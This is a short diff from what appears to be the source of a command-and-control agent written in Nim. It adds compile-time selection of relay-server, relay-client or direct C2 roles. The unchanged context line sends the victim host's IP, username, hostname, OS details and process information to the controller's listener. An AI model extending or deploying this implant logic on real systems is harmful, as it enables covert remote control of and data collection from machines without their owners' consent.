@@ -693,8 +693,12 @@ proc httpHandler() {.async.} =
             let processName = getCurrentProcessName()
             
             # HTTP relay system: role is determined by RELAY_CHAIN/RELAY_PORT compile flags
-            # Legacy: let relayRole = determineRelayRole()
-            let relayRole = "standard"  # Default role, HTTP relay uses compile-time flags
+            let relayRole = when defined(RELAY_PORT):
+                "RELAY_SERVER"  # Compiled with listen port - will act as relay server
+            elif defined(RELAY_CHAIN):
+                "RELAY_CLIENT"  # Compiled with relay chain - connects through relay
+            else:
+                "STANDARD"      # Standard agent - direct C2 connection
             
             webClientListener.postRegisterRequest(listener, localIP, username, hostname, 
                                                  osInfo, pid, processName, false, relayRole)
